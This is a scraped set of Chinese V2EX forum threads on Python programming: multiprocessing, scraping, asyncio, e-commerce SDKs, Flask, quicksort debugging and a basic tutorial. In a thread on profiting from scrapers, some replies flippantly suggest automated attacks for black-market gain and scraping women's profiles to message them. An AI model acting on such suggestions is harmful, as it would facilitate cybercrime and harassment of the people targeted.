{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Python 版本 3.4.2 ，主进程内的定义了一个 RabbitMQ 连接，变量为 connection ，保存了该链接的句柄。</p>\n<p>我需要在四个子进程内分别使用这个句柄的方法，但是报错：</p>\n<pre><code>Can't pickle &lt;class '_thread.lock'&gt;: attribute lookup lock on _thread failed \n</code></pre>\n<p>Google 搜索结果都是建议使用 multiprocessing.Queue 来进行进程间通讯，但是看起来不能满足我的需求。请问大家对于这种子进程共享父进程内的变量（句柄）是怎么处理的呢？</p>\n<p>代码如下</p>\n<pre><code>from multiprocessing import Pool\nimport os, time, random, sys, pika\n\ndef long_time_task(rabbitmq_handle):\n\n\ndef e_c(e):\n    print(e)\n\n\nif __name__=='__main__':\n    connection = pika.BlockingConnection(pika.ConnectionParameters(\n        host='172.17.0.9'))\n\n    p = Pool()\n    for i in range(5):\n        p.apply_async(long_time_task, args=( connection,  ), error_callback=e_c)\n    print( 'Waiting for all subprocesses done...')\n    p.close()\n    p.join()\n    print( 'All subprocesses done.')\n\n\n</code></pre>\n</div></div>"], "reply": "6", "tittle": "请问 Python 多个子进程应当如何调用同一主进程的句柄", "comment": ["看起来加个进程锁可以解决", "首先你要确定这个句柄是否为线程安全？比如说 mysqldb 连接就是非线程安全句柄。", "一般内存比较大的情况下无论是不是线程安全句柄，我都是在 threading 的构造函数里面传入一个新的连接句柄，这样有多少个线程就会产生多少个连接句柄。好处是句柄其中一个句柄链接断了，不影响其他线程。", "这种 socket 对象， lock 对象， thread 对象是不能跨进程传输的，你只能把主进程当做一个 ProxyServer 然后子进程调用主进程的方法，实际上还是由主进程去执行，不能把上面三种对象从一个进程传输到另一个进程上的", " \r", " \r", "\r", "好的谢谢，了解了。看起来确实不是线程安全的。我还是每个进程都有独立的链接好了，四个链接内存消耗可以接受。", "唯一一种传输 socket lock thread 的办法是利用 linux 的 fork 机制，因为那样可以完全复制主进程的文件句柄，但是也只是在启动的时候，后续依然无法传输，而且控制不好很容易死锁（比如 pymongo 的官方文档就明确说到不是 fork 安全的）", "纠正一下， Lock 对象确实不能跨进程传输，不过 socket 对象是可以的。下面的代码中，`conn`变量可以直接传递给子进程：\r", "\r", "\r", "```python\r", "from multiprocessing import Process\r", "import socket\r", "\r", "def echo_server(conn):\r", "    while True:\r", "        data=conn.recv(1024)\r", "        conn.sendall(data)\r", "    \r", "if __name__==\"__main__\":\r", "    process_list=[]\r", "    s=socket.socket()\r", "    s.bind(('127.0.0.1', 5555))\r", "    s.listen(5)\r", "    while True:\r", "        conn, addr = s.accept()\r", "        print('Connection from {addr[0]}:{addr[1]}'.format(addr=addr))\r", "        p=Process(target=echo_server, args=(conn,))\r", "        process_list.append(p)\r", "        p.start()\r", "```\r", "\r", "此外，`multiprocessing.Lock`是基于`SemLock`对象构造的。而`SemLock`又是`sem_open`/`CreateSemaphore`的封装。至少 Linux 下是使用命名信号量的实现的（但 Windows 下没用名字，不过要复制句柄还是可以的），所以理论上是可以跨进程复制的。\r", "\r", "如果不嫌麻烦的话（我的意思是这样做很麻烦），可以参考`multiprocessing.reduction`，自己实现`multiprocessing.Lock`对象的可 pickle 化，以及传输之后重新打开命名的信号量 /或者复制句柄。然后`Lock`对象也就可以跨进程传输了。\r", "\r", "不过考虑一下开发成本已经稳定性，用 4 个连接真的没什么不好的。。。。。 Orz"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://coinmarketcap.com/,%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E6%98%AF%E4%B8%80%E4%B8%AA%E8%99%9A%E6%8B%9F%E8%B4%A7%E5%B8%81%E7%9A%84%E7%BB%9F%E8%AE%A1%E7%BD%91%E7%AB%99,%E6%88%91%E6%83%B3%E9%80%9A%E8%BF%87\" rel=\"nofollow\">https://coinmarketcap.com/,这个网站是一个虚拟货币的统计网站,我想通过</a> python 每天抓取排名前一百位的品种数据,市值变化成交量变化,特别是 24 小时成交量数据,并能每天生成数据统计图表,这个靠 python 能实现吗?这个项目比较小型,如果有人能接活的麻烦联系一下</div>"], "reply": "11", "tittle": "有个小型项目求指点或者接活", "comment": ["抓取可以实现，不知想要实现什么样的统计图表呢，另外报价如何？", "var allItems = []  \r", "    $('#currencies tbody tr').each(function(id, item) {  \r", "        var oneItem = []  \r", "        $(item).find('td').each(function (id, td) {  \r", "            switch(id) {  \r", "                case 1 :  \r", "                    oneItem.push($(td).find('a').text().replace(/\\s+/g, ''))  \r", "                    break;  \r", "                default:  \r", "                    oneItem.push($(td).text().replace(/\\s+/g, ''))  \r", "            }  \r", "        })  \r", "        allItems.push(oneItem.join('|'))  \r", "    })  \r", "    console.log(allItems.join('\\n'))  \r", "\r", "随便写了一个，在 console 里跑吧，跑出来的结果导入到保存成 csv ， 导入 Excel ，想怎么搞怎么搞。\r", "\r", "/revisions", " ,能实现每个品种每天生成柱状图即可,主要是想看资金流入流出情况", " 感谢,我跑跑看", " 要是 gist 能贴打赏二维码就好了， 233333", "想要实现的就是类似百度 echart,http://echarts.baidu.com/demo.html#bar-tick-align 这样的效果就可以,数据最好每天自己抓取,减少人为操作的环节", " 报价可以私信我,谢谢", " V2EX 没有私信功能", " @", " ,可以联系我 weixin@eric606", " 感兴趣的话可以加微信详聊，微信号同 v2 ID", "这个可以啊，免费的要不要。。这样做我只能用 flask+echarts"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>举个例子，有一个列表[1,2,3,……,m]\n\n如何让他一次“同时”输出 n 个？\n\n比如\n1\n1\n1\n\n2\n2\n2\n\n3\n3\n3\n\n4\n4\n4\n\n5\n5\n5\n\n下面这个要输出几次，就创建几个实例的写法感觉太笨了，也不好维护，有没有灵活的方法？\n当然，这个例子有点傻，因为执行过的没必要再执行一次。实际情况应该是如何根据队列灵活的调整执行速度。\n</code></pre>\n<pre><code>import asyncio\n\nli = [1,2,3,4,5,6,7,8,9,10]\n\ndef hello():\n    for i in li:\n        print(str(i)+\"\\n\")\n\nasync def main():\n    loop = asyncio.get_event_loop()\n    future1 = loop.run_in_executor(None, hello)\n    future2 = loop.run_in_executor(None, hello)\n    future3 = loop.run_in_executor(None, hello)\n    await future1\n    await future2\n    await future3\n\nloop = asyncio.get_event_loop()\nloop.run_until_complete(main())\n</code></pre>\n</div></div>", "<div class=\"topic_content\">解决了...</div>"], "reply": "2", "tittle": "asyncio 可以指定协程的数量吗？", "comment": ["令牌桶？", "楼主后来怎么解决的？"]},
{"content": ["<div class=\"topic_content\">本人准备接入京东联盟（自定义链接推广），官方文档写的好模糊，更坑的是 python 版本的 SDK 也被删除了，不知道有没老司机接入过京东联盟的推广的能给我点指导？</div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><h2>奋战了一晚上终于解决了！</h2>\n<h2>京东整个流程真的好坑好坑（python版本SDK都没有，文档写的真的是很差很差）， 大致分为这么几个步骤：</h2>\n<ul>\n<li>先创建开发者应用(<a href=\"http://jos.jd.com\" rel=\"nofollow\">http://jos.jd.com</a>), 选择1.买家应用，选择联盟应用，然后创建应用</li>\n<li>填入你的回调地址，记住这个回调地址是用于请求远程的京东api的，来获取应用返回的ACCESS_TOKEN</li>\n<li>\n<h3>一定要在白名单添加你自己服务器的IP（回调服务器的IP），否则一直会提醒你服务器没有权限访问应用</h3>\n</li>\n<li>在应用内操作点击测试（你自己拼接也可以，建议用测试服务器可以免去拼接问题），这个时候会让你登陆，输入你联盟的账号密码，然后这个时候你会有一个ACCESS_TOKEN，然后去请求 <a href=\"http://auth.jd.com\" rel=\"nofollow\">http://auth.jd.com</a>,就可以转换成联盟id了</li>\n</ul>\n<hr>\n<p>今天太困了写的东西不详细，明天写一个详细的教程</p>\n</div></div>"], "reply": "11", "tittle": "有接入京东联盟，但是发现问题好多啊", "comment": ["这东西还活着？", " 或者呢，但是实在不知道怎么接入他们的联盟，啥都没有", "入过坑京东开普勒的坑；建议你整理一下问题，然后给他们技术发邮件，会有人打电话联系你的。", " 找了半天也没找到他们邮箱是多少，能告诉我吗？", " 开普勒京东客服邮箱地址 ", " 解决了，过程有点坑，有空发个帖子单独写这个东西", "请问怎么解决的呢？", " 不好意思，回复有点晚了，不知道你解决了没有。我说一下流程和参考文章\r", "参考文章地址： ", " （这个是 PHP 版本的，写的有点不详细但是大方向是正确的）\r", "1.去 JOS 上注册一个个人开发应用，具体流程看文章\r", "2.需要有一台公网能被京东访问到的服务器，它会给你随机的字符串,请保存这个字符串\r", "3.然后请求 OAUTH 接口，格式如下：\r", "\"https://oauth.jd.com/oauth/token?grant_type=authorization_code&client_id=\" + appKey \\\r", "                  + \"&client_secret=\" + appSecret \\\r", "                  + \"&scope=read&redirect_uri=http://\" + url \\\r", "                  + \"&code=\" + code \\\r", "                  + \"&state=1234\"\r", "然后会返回一个 KEY 格式大致如下：\r", "{\r", "  \"access_token\": \"c52e5f75-4d5e-4ef0-b592-833xxxxx\",\r", "  \"code\": 0,\r", "  \"expires_in\": 31535999,\r", "  \"refresh_token\": \"b85032ee-5eec-4d9f-a70a-444c81xxxx\",\r", "  \"time\": \"1483732058097\",\r", "  \"token_type\": \"bearer\",\r", "  \"uid\": \"xxxx\",\r", "  \"user_nick\": \"secret\"\r", "}\r", "4 ，生成密钥： a)先生成签名， b)生成参数\r", "签名算法：\r", "1.将要请求的参数按字母顺序排列，然后参数后面加上你的参数（这个有点绕口），比如：\r", "{'app_key': appKey,\r", "                                           'v': '2.0',\r", "                                           'access_token': access_token,\r", "                                           'method': 'jingdong.service.promotion.batch.getcode',\r", "                                           'timestamp': time_stamp,\r", "                                           }\r", "那么 sign 参数就是 sign=app_keyappkeyv2.0access_tokenaccesstokenmethodjingdong.service.promotion.batch.getcodetimestamptime_stamp （不要换行也没有空格）\r", "生成参签名等于:md5(appSecret + sign + appSecret).hexdigest()\r", "5.用生成好的签名去访问相关的接口+SKUID 就可以得到推广链接了", "京东这个确实很坑，陆续花了两天基本解决，他们文档太过散乱，要自己整合", " 神奇的 SDK 写的都是一些无用的注释", " 确实，不知道文档都这么混乱，他们内部到底怎么开发的"]},
{"content": ["<div class=\"topic_content\">Flask 内建的 http 服务器不耐艹，怎么办，每三次出现一次 IOError 然后 broken pip 了。。然后我换用了 uwsgi 跑 flask 也是酱紫，目前还在用 Flask 开发，有大神门知道这是啥缘故？怎么解决？\r<br>服务器完全没问题：自己家的笔记本，就放这么一个 Flask 测试，而且跑的还是 CentOS 7 。\r<br>前端用 Nginx 饭袋的。</div>"], "reply": "16", "tittle": "Flask 内建的 http 服务器不耐艹，怎么办，每三次出现一次 IOError 然后 broken pip 了。。", "comment": ["这是对方异常关闭连接导致的。", " 知道，因为超时了。超时才会产生异常关闭连接。。。 TMD 关键是为何跑 2-3 次， Flask 就会出现这种超时的现象。", "那是要你自己找为啥你的应用会超时。或者把 ng 超时时间设长些。", " 一个普通的 sql 查询。前两次都是毫秒级的。后面就不行了。 NG 时间 300 秒了。不能再长了。。", "改成多进程的，有参数配置", " 已经是 threaded=true 了。开了多线程了。。多进程会比较好？", "你要不自己写个小 test 程序反复调用你的 @", " 方法，不经过 flask 调用，然后统计统计你自己的业务函数的执行速度是不是衰减严重，最后再去找 flask 的问题", " py 的多线程是假多线程，可能有问题。。。弄成多进程的话，执行就和 php 方式类似了，不过 php 的 php-fpm 要成熟很多， gunicorn 之类的不好说", " 换了 Python 版本解决了。。。之前用的是系统自带的 2.7.5 现在换成 2.7.13", " 假的？好蛋疼啊。。。", "不都是用 WSGI 么？\r", "还是我理解错了?", "好吧，看到 uuWSGI 也出问题了\r", "感觉 flask 本身的问题可能比较小， flask 毕竟还是有不少生产环境部署的。", " 恩。所以我在怀疑。谷歌了有人说是没有清空缓冲区造成的。。 Python 社区有这个问题提了。而且已经关闭了。。于是想到了换版本。生产环境，我看了豆瓣的书。他们都是同时启用多后端，用 ip_hash 来反代，这样的效果就是多多多线程加多多多进程。基本上不会出现这种问题吧。", " 多线程是真的，但字节码不能并行执行（ GIL ）。所以多线程只对 IO 等待有效，像爬虫这种程序不受影响， http 一半一半。一般来说建议多进程。", "自带的是有这个毛病，我一直是用 gunicorn ＋ gevent 跑，效果拔群", "以前遇到过类似的，但是是 gunicorn 的版本不够新。更新后就再也没出现过。"]},
{"content": ["<div class=\"topic_content\">Python 2 是否还是主流 ?\r<br>\r<br>前途是光明的, 但问题是: 我们还需要多久才能等到黎明 ?</div>"], "reply": "17", "tittle": "截止 2017_1_24, 国内有多少公司的 Web 后端技术栈, 是基于 Python 3 的?", "comment": ["大部分是 py2 维护和转 py3 齐头并进吧..", "2017-1-24 我司还在用 py2.6", "2017-1-24 我司还在用 py2.7", "py2.6 ，感觉旧代码是转不了 py3 的，测试成本高的离谱。", " 是不是服务器 centos ？", "我司 2.7 3.5 都有", " centos6.5", "我们公司有些项目已经拆出来转成 3 了，但是大部分还是 2.7", "2017-1-24  - py2.7", "虽然还是在 Python2.7 但是我自己还是会在 3 上跑一遍而已，保证兼容。当热和 3 的一些新语法是无缘了。", "在微信支付， py 只配做脚本和内部管理段", "我司 2.7 与 3.5 齐飞", "2008-2017 ， Python 2.x 版本的现状总让我很难相信 Python3 是近十年前发布了了。", "一般运维这条线的基本上都会 2.x 的， Linux 发行版基本上都是默认内置的 2.x\r", "可能做研发之类的用一些新特性会用 py3 多一些，其实还真没有什么 3 能做 2 做不了的。", "可以看看知名库对 Python 3 的支持情况：\r", "\r", "我司还是 2.7  貌似有一小部分 3", "我们部门都是 Python3 🙋"]},
{"content": ["<div class=\"topic_content\">之前不知道有这么个软件，如果知道，应该早就装上用了吧\r<br>然后自己在机器上装了 pyenv 、 virtualenv 等，不知道装上 anaconda 和这些软件会不会有冲突\r<br>\r<br>有安装过或使用过的 v 友是否可以说下感受</div>"], "reply": "18", "tittle": "有人在 macOS 上用 anaconda 吗，我想问如果系统上本身有 Python ，他们之间有冲突吗？", "comment": ["理论上不会有冲突的\r", "可以在第一行指定解释器\r", "\r", "#!/usr/bin/python", "anaconda 和 virtualenv 不兼容， conda 自己有隔离功能", "不冲突，装 anaconda 就是为了避免冲突。。。", " \r", "\r", "anaconda 它不是自带了 python 、 ipython 等环境吗，它们和系统的版本不冲突吗，那我怎么指定呢，我知道 conda 应该是有隔离功能，但是 anaconda 这个软件和系统自带的怎么和谐相处呢\r", "\r", "\r", " \r", "我是否可以 Virtualenv 用于正常软件开发，其他情况用 anaconda 呢", "控制一下 anaconda 在 PATH 中的顺序，要用 anaconda 的时候 source activate 到前面来。", " 不冲突，一般装好 conda 后目的就是不再用 virtualenv 和系统 python 。楼上说 conda 可以隔离的，装了 conda 目的就是可以全盘接管各种需求，实在没必要再用 virtualenv 和系统的 python ，混着用才容易出问题。实在想用系统自带的，临时改一下 PATH 就行了。", " 推推，回答得好\r", "\r", " 之所以不衝突是因為 anaconda 是裝在家目錄 $HOME 中，而系統的 python 多半是裝在系統的某個位置而把執行連結放到 /usr/bin 。安裝 anaconda 時會問是否加入 $PATH 等環境變量中。反過來說，如果用 root 執行軟體就無法用 anaconda 了。專案就各自獨立，用 conda 的機制隔離。", "期待不冲突，使用要小心。通过 which python 验证你在用哪个 python ， which pip 同理。", "pyenv", "不冲突，事实上把 anaconda 的 python 作为唯一的 python 都没问题。我就是把自带 python 卸载了，只留 anaconda 的", " 在 py2.7 下， virtualenv 跟 anaconda 是冲突的，这个 bug 到现在还没解决。\r", "\r", "ref: ", "有用 anaconda ，今天刚用 virtualenv 不会冲突", "Mac 本身有 py2.6 2.7\r", "不过我一般会用 brew 装一个 python \r", "自己装的 python 和系统的 python 位置不一样\r", "系统的在 /usr/bin 自己装的 python 在 /usr/local/bin ，然后你在 shell 中运行 python 时，他有个优先级列表，你也可以指定 pythin 的位置。\r", "\r", "初学不久，个人拙见，望指教", "你装了 anaconda 之后，它会自动在 bashrc 里边 prepend 到你的 PATH 。", "不会冲突， Anaconda 的环境变量和 Python 不一样。现在很多 lib 的开发都是找到 Anaconda 环境变量，之后自动解决依赖问题。", "同意 15 楼，比如 caffe 之类的，都需要指定 python 的位置。", "pyenv", "我的 mac,2.6 和 2.7 并存，可以指定默认的。"]},
{"content": ["<div class=\"topic_content\">做桌面应用不好 deploy ，也不好保护代码，有哪些方面是 python 比较容易上手做一些小项目盈利？</div>"], "reply": "25", "tittle": "Python 爬虫如何来盈利，很多会涉及到版权吧？", "comment": ["Python 应该不会，如果用 java 爬虫，小心 oracle 告你。", "python 代码保护，可以看看 odoo 的企业版", "刚学会 python 做爬虫就想着赚钱了，你怎么不去抢", "   ......这也喷？", "这年头，赚钱很可耻吗?", "你以为我会告诉你？", "如果单卖软件不一定侵权，比如你在用户协议里写明只能用于合法用途，比如学习和研究之类的。\r", "我觉得最大的问题是，如果软件一般就根本卖不掉，如果软件非常好就会被盗版，到头来都挣不到钱。", "一些卖数据的公司就是用爬虫抓数据盈利，版权问题小公司考虑的不多", "爬到的数据来盈利的途径很多，看你提供什么。你要是直接卖爬虫是另外一回事了", "爬虫做个比价吧\r", "记得现在的比价双 11 会不提供服务，现在开始搞数据积累 10 个月正好双十一推广。", "爬豆瓣妹子，然后想要直接给妹子发豆油需要买会员，别人已经这么做了", "python 可以混淆的，比如 ", " 然后呢。。会有人付费么", "你懂的网站", " 我也想，方便联系？", "做 SEO 引流量，如果现在 SEO 还是像以前那样玩的话。", "做类似这种网站 ", " 。为各种研究机构提供数据类的服务，还有各种大厂的咨询服务", "提供数据就可以了，干嘛要提供代码？", "1. 爬取细分行业数据，做行业站挂广告(CPC 赚钱)\r", "2. 像 10 楼的同学讲的，爬商品价格，做比价站(CPS 赚钱)\r", "3. 接爬取数据的外包业务(Freelanceer 赚钱)\r", "上面三点还能扩展出很多形式。\r", "\r", "其它的盈利方式还很多，核心点是要能解决一部分人的问题，你就有钱赚", "很多东西是无版权的，只要能解决一部分人的痛点就可以", "V2 有人在做这个，叫造数", " 肯定会有，用豆瓣约炮可不是传说", "r#1 @", " #1 Java 你用 Openjdk 就好了", " 方法有效可行！ 做大就困难了。毕竟需求量无法达到。", "用 python 自动化攻击 搞黑产"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>用于发现 SNI 代理服务器， sni 代理的作用你懂的</p>\n<p>食用方法简单</p>\n<p><a href=\"https://github.com/garsonbb/sni-detecter\" rel=\"nofollow\">https://github.com/garsonbb/sni-detecter</a></p>\n</div></div>"], "reply": "14", "tittle": "新手向，用 py 写了个 SNI 代理的扫描工具", "comment": ["建议把百度换成知乎或者其他没有上 cdn 的测试目标，否则会扫到大量云加速和 bfe 。我之前也写过 go 的版本但是后来发现其实 zmap 可以扩展 go 的插件来实现。。。", "建议换成 google ，有些 sni proxy 会使用白名单， nginx 之类的貌似默认没这个功能", " zgrab ？", " 谢谢提醒", "还是要低调点 :)", "灰常棒", "IP 段不支持 CIDR ？", " 不支持哦，你可以自己改一下", "TSL 握手阶段的 server name 既然可以被中间人看到，是否可能被 reset ？", "我想多了， TSL 协商阶段的证书本来就可以被看到，多一个 SNI 也无所谓。", " TLS", "话说 SNI 代理到底是干嘛的？", " 就是代理啊  你用 hosts 强制定过去后 他转发，证书还是目标网站的，优势是国内部署私人 DNS 小范围分享方便", "有些 ip 只是握手，却不能代理实际内容？"]},
{"content": ["<div class=\"topic_content\">可能是这些网站用了 activeX ，只有 IE 才支持，这样的网站怎么爬 ？</div>"], "reply": "14", "tittle": "有些网站指明要求必须用 IE 打开，这样的网站应该怎么爬？", "comment": ["用 webbrowser 组件爬", "伪造 user-agent", "selenium", "伪造 user-agent ——用 IE 的控件（ webbrowser ）效率应该非常低。", "抓包解析", " selenium 支持 IE???我们乡下人读书少，你不要骗我", " 你确定？？能行？？？你实验过没有？？", "为啥不行？为啥不是你去实验？@TaMud", " Selenium 支持 IE 的啊。", "模拟 IE", "楼上说的很清楚了，伪造 User-agent 。\r", "另外我要吐槽楼主，你不自己去尝试，反而让回答者去试验，楼主你是有多懒？", "你真懒", " 话说我哪里有让回答者去试验了。。。", "Selenium + PhantomJs"]},
{"content": ["<div class=\"topic_content\">python 调用淘宝 SDK 示例代码一直显示 Name or service not known\r<br>\r<br>不知道问题出在哪里\r<br>\r<br><img src=\"https://ww2.sinaimg.cn/large/006xsmyBly1fca2plyu64j30u70lg766.jpg\" class=\"embedded_image\"> \r<br>\r<br>\r<br>如果用官方示例，出现下面的错误提示\r<br>\r<br># -*- coding: utf-8 -*-\r<br>import top.api\r<br>\r<br>req=top.api.TbkItemGetRequest(url,port)\r<br>req.set_app_info(top.appinfo(appkey,secret))\r<br>\r<br>req.fields=\"num_iid,title,pict_url,small_images,reserve_price,zk_final_price,user_type,provcity,item_url,seller_id,volume,nick\"\r<br>req.q=\"女装\"\r<br>req.cat=\"16,18\"\r<br>req.itemloc=\"杭州\"\r<br>req.sort=\"tk_rate_des\"\r<br>req.is_tmall=false\r<br>req.is_overseas=false\r<br>req.start_price=10\r<br>req.end_price=10\r<br>req.start_tk_rate=123\r<br>req.end_tk_rate=123\r<br>req.platform=1\r<br>req.page_no=123\r<br>req.page_size=20\r<br>try:\r<br>\tresp= req.getResponse()\r<br>\tprint(resp)\r<br>except Exception,e:\r<br>\tprint(e)\r<br>\r<br>\r<br><img src=\"https://ww2.sinaimg.cn/large/006xsmyBly1fca2uu6rmwj30yu0mnabx.jpg\" class=\"embedded_image\"> </div>"], "reply": "9", "tittle": "淘宝开发平台 Python SDK 遇到问题，请前辈指导 详情有有代码有截图", "comment": ["dns 问题？", "``` python\r", "url  = '", "'\r", "```\r", "\r", "这样的吧", " #1 请问下从哪判断是 DNS 的问题呢。我感觉应该不是\r", "\r", "\r", " #2 按你说的改一下 url,有新的错误提示\r", " ", "  \r", "\r", "应该不是 url 的问题吧", "Name or service not known \r", "\r", "标准的 DNS 无法查询到结果 好好学下英文吧", "Missing app key\r", "缺少 app key 参数", "你的 key 在哪看的，应该是正式环境的 key, 这个 url 是测试环境的。不匹配，我猜的", "  提示 \"Name or service not known\" 要么 dns 有问题要么域名不正确", "来来回回调了两天了，第一步都进不去，换了在线环境也不行，出错问题就是上面截图中的几种。\r", "\r", "我是无语了。。。\r", "\r", "\r", "有朋友闲着故意提供详细咨询或者远程帮助的吗？愿意红包感谢。先谢谢了。", "可以直接加 V 3592 零 7480  或 Q 132326 玖 369"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>楼主最近在做一个项目，技术采用了 Tornado+Redis ， 其中在设计用户账号类的时候为了保证代码不会太分散，就把所有与用户账号有关的操作放到 Account class 中，也包括了 login(),register(), logout()...</p>\n<p>这样我在 Account 中使用 python 的 @classmethod 装饰器来装饰与具体实例无关的操作，如 login(),register()等，通过 Account.Login(email, password)来进行一些登陆的操作</p>\n<p>我想了解的是这样设计可以吗，会不会导致 Account 类越来越庞大，以后难以维护呢？（或者还有什么其他的缺点？）</p>\n<p>Account 类在此：( <a href=\"https://github.com/cufrancis/savemylink/blob/master/lib/Account.py\" rel=\"nofollow\">https://github.com/cufrancis/savemylink/blob/master/lib/Account.py</a> )</p>\n<p>demo 在此：( <a href=\"http://savemylink.lllnhhy.com\" rel=\"nofollow\">http://savemylink.lllnhhy.com</a> )</p>\n</div></div>"], "reply": "4", "tittle": "面向对象中类应该如何设计？", "comment": ["不好回答。没有具体的要求，何必劳动众。设计本身就是为了解决实际问题。但我觉得代码写多，会有面向对象的设计感觉 。", "怕膨胀的话完全可以一个类一个方法，习惯就好，哈哈", "难道不应该这么归类么？你的账号的操作能有多少个？", " 你可以看下我的 Account 类，所有和账号有关的都在 Account 类中：\r", "user = Account(uid=1)\r", "\r", "user.nickname // 用户昵称\r", "user.email // 用户邮箱\r", "...\r", "...\r", "user.links() // 用户发布的所有链接\r", "user.link()[0].title // 用户发布的链接的标题"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>\n#-*- coding:utf-8 with BOM -*-\ndef quick_sort(numbers,left,right):\n    #print(\"left,right 分别为%d,%d\"%(left,right)) \n    if right - left &lt;= 1:\n        return numbers\n    temp = numbers[left]\n    i = left\n    j = right - 1\n    while i &lt; j:\n        while numbers[j] &gt; temp and i &lt; j:\n            j = j - 1\n        else:\n            numbers[i] = numbers[j]\n        \n        while numbers[i] &lt; temp and i &lt; j:\n            i = i + 1\n        else:\n            numbers[j] = numbers[i]\n    \n    numbers[i] = temp\n    \n    quick_sort(numbers,left,i)\n    #quick_sort(numbers,i+1,right) #问题出在这一行\n\n    return numbers\n\ntest = [3,7,8,5,1,2,11,5,4]\nprint(quick_sort(test,0,len(test)))                \n</code></pre>\n<p>看了一些相关想自己写一下 XD<br>\n问题出在倒数第四个语句，如果把倒数第四个语句注释掉，把 test 数组的第一个数不论给改改成什么数，小于这个数的那部分的顺序总是没毛病的。<br>\n我的想法是第一次分组就用数组中的第一个数当做基准，分出比它小的和比它大的两组。然后比它小的那一组，是从坐标 0 到坐标（ i-1 ），比它大的一组是坐标(i+1)到坐标(数组长度-1)<br>\n因而就有了倒数第五个语句和倒数第四个语句分别对较小组和较大组的处理。但是不知道为什么，较大组的处理总是出错 QAQ<br>\n求指点，谢谢<br>\n补上报错</p>\n<pre><code>\nD:\\python\\algorithm&gt;python quick_sort.py\nleft,right分别为0,9\nleft,right分别为0,2\nleft,right分别为0,1\nleft,right分别为2,2\nleft,right分别为3,9\nTraceback (most recent call last):\n  File \"quick_sort.py\", line 28, in &lt;module&gt;\n    print(quick_sort(test,0,len(test)))\n  File \"quick_sort.py\", line 23, in quick_sort\n    quick_sort(numbers,i+1,right) #问题出在这一行\n  File \"quick_sort.py\", line 15, in quick_sort\n    while numbers[i] &lt; temp and i &lt; j:\nKeyboardInterrupt\n</code></pre>\n<p>left,right分别为3,9这一句之后程序应该是陷入死循环一样，但是什么输出都没有，最后被我强行暂停。<br>\n我对于进入死循环但是什么输出都没有感到很奇怪，因为我在做这个测试的时候已经把函数块第一个语句的注释符号删掉了，按理来说只要调用了这个函数就一定会有输出。但问题在于，程序像是死循环一样，却始终没输出。。</p>\n</div></div>"], "reply": "17", "tittle": "请轻喷。自己尝试写了一下快速排序，出了点问题，求指点", "comment": ["i+1 -> i + 2", " 这样改了之后不会出现不出结果的错误。。但是输出的结果并没有对较大组进行整理。。", " ", " 加上对微博图床的 https 地址的支持吧", "你那里错我不知道，但根据你的代码改了改可以跑。\r", "\r", " 也就是说 quick_sort(numbers,i+1,right)这个思路是对的没毛病，真正的错误在函数的具体过程里？\r", "可是为什么对于较小组都能正常排序对于较大组就不能呢。。", " 好的，正在做。", "讲道理这个问题你只要把数组打出来就可以发现了。\r", "这是第一次遍历，也就是你要处理 3,9 时候的数组\r", "2,1,3,5,8,7,11,5,4 恩，你模拟一下就知道问题出在哪里了\r", "ps 你这个要改的话，，，大概只需要 1s ？", "我虽然也写 python ，但是我把序号什么的改了一下，不过应该影响不大", " 表示。。。你虽然图贴的确实能够解决楼主的问题。。。但是一般不一定能看明白到底问题是哪里。。。因为 lz 大方向没错啊。。。", " 已经可以支持。", "和数组大小没有联系，和数组结构有联系。\r", "\r", "最简单的例子：[1, 2, 1] ，第一个 while 永远无法跳出。\r", "\r", "讲道理，你这个代码很少见。。。按照维基或者 5 楼的实现一个呗。", "按照维基写了一个。楼主写完可以参考一下。\r", "\r", "要说思路嘛倒是没错，就是过于繁琐不容易写对，就比如 numbers[i] = numbers[j]这句直接把 numbers[i]的值给写没了，下面那句也是一样", " 。。。话说写没了应该是没问题的。。。最开始的 numbers[i]是那个临时的值，后面每次替换实际上都是有一个临时位置来顶替的", "改了下 可以跑了 楼主可以看下 加了几句\r", "\r", "第一个 else 里的 numbers[i] = numbers[j] 之后 i 要加 1  不然 number[i]总是等于 temp  第二个 while 完全跑不到。\r", "\r", "\r", "def quick_sort(numbers,left,right):\r", "    if right-left<=1:\r", "        return numbers\r", "    temp = numbers[left]\r", "    i = left\r", "    j = right-1\r", "    while i<j:\r", "        while numbers[j]>temp and i<j:\r", "            j = j-1\r", "        else:\r", "            if(i==j):\r", "                break;\r", "            numbers[i] = numbers[j];\r", "            i=i+1;\r", "        while numbers[i]<temp and i<j:\r", "            i = i+1;\r", "        else:\r", "            if(i==j):\r", "                break;\r", "            numbers[j] =numbers[i];\r", "            j=j-1;\r", "    numbers[i] =temp;\r", "\r", "稍微偏个题：建议 UTF-8 编码不要加 BOM 。用处不是很大，也容易造成问题。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>函数</h2>\n<p>函数是<code>Python</code>为了代码最大程度的重用和最小化代码冗余而提供的最基本的程序结构。</p>\n<ol>\n<li>函数式：将某功能代码封装到函数中，日后便无需重复编写，仅调用函数即可</li>\n<li>面向对象：对函数进行分类和封装，让开发“更快更好更强...”</li>\n</ol>\n<p>函数式编程最重要的是增强代码的重用性和可读性</p>\n<p>创建的函数语法</p>\n<pre><code>def 函数名(参数):\n    ...\n    函数体\n    ...\n    返回值\n</code></pre>\n<p>简单的实例</p>\n<pre><code># x 为函数的参数\n&gt;&gt;&gt; def num(x):\n...  print(x)\n...\n# 123456 等于 x\n&gt;&gt;&gt; num(\"123456\")\n123456\n</code></pre>\n<h2>函数的返回值</h2>\n<p>函数的返回值需要使用到<code>return</code>这个关键字，返回值主要是用来接受函数的执行结果</p>\n<pre><code>&gt;&gt;&gt; def re():\n...   if 1==1:\n...     return True\n...   else:\n...     return False\n...\n&gt;&gt;&gt; re()\nTrue\n</code></pre>\n<p>函数 return 后面是什么值， re 就返回什么值，如果没有指定 return 返回值，那么会返回一个默认的参数<code>None</code></p>\n<p>在函数中，当<code>return</code>执行完成之后，<code>return</code>后面的代码是不会被执行的</p>\n<pre><code>&gt;&gt;&gt; def ret():\n...  print(\"123\")\n...  return True\n...  print(\"abc\")\n...\n&gt;&gt;&gt; 